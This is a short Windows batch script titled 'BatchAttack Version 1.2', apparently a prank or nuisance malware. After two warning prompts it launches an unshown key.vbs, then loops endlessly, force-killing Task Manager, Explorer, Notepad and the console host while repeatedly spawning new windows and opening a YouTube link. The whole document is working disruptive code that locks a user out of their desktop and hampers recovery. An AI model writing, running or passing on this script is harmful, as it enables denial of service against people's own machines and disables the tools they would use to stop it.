@echo off
title BatchAttack Version 1.2 by SleekZ

echo Are you sure you want to run BatchAttack? The author is NOT responsible for any damage done to this machine!
pause
cls
echo Last chance!
pause   
cls
echo Loading BatchAttack. . .
ping localhost -n 1 >nul
start key.vbs
ping localhost -n 2 >nul
goto :BigTing





:BigTing
goto :anticlose



:anticlose
taskkill /f /im taskmgr.exe
taskkill /f /im notepad.exe
taskkill /f /im explorer.exe
taskkill /f /im conhost.exe
goto loop

:loop
start 
start https://www.youtube.com/watch?v=pxw-5qfJ1dk
goto BigTing
